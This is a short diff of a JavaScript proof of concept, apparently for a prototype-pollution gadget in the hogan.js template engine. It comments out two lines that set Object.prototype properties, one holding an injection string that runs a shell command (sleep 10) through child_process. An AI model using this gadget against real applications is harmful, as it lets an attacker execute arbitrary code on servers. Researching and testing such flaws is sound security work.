@@ -3,8 +3,8 @@ const hogan = require("hogan.js");
 
 /* Polluted Payload*/
 // inject property to root prototype
-Object.prototype.delimiters = 'tr \n';
-Object.prototype.indent = '/*"));return process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()//*/';
+// Object.prototype.delimiters = 'tr \n';
+// Object.prototype.indent = '/*"));return process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()//*/';
 
 /* Exported Function Call*/
 const TEMPLATE = `
